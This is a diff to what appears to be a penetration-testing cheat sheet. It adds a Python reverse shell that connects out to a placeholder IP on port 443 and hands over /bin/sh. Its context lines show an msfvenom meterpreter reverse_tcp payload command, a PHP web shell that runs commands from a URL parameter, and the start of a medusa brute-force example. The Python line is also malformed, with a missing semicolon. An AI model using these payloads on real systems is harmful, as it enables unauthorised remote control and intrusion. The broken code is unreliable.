@@ -45,6 +45,14 @@ msfvenom -p windows/meterpreter/reverse_tcp [your_ip_address] LPORT=[Port] -f as
 <<?php echo shell_exec($_GET['cmd']);?>
 ```
 
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<IP Address>",443))
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)p=subprocess.call(["/bin/sh","-i"])
+```
+
 medusa example
 ```shell
 medusa \
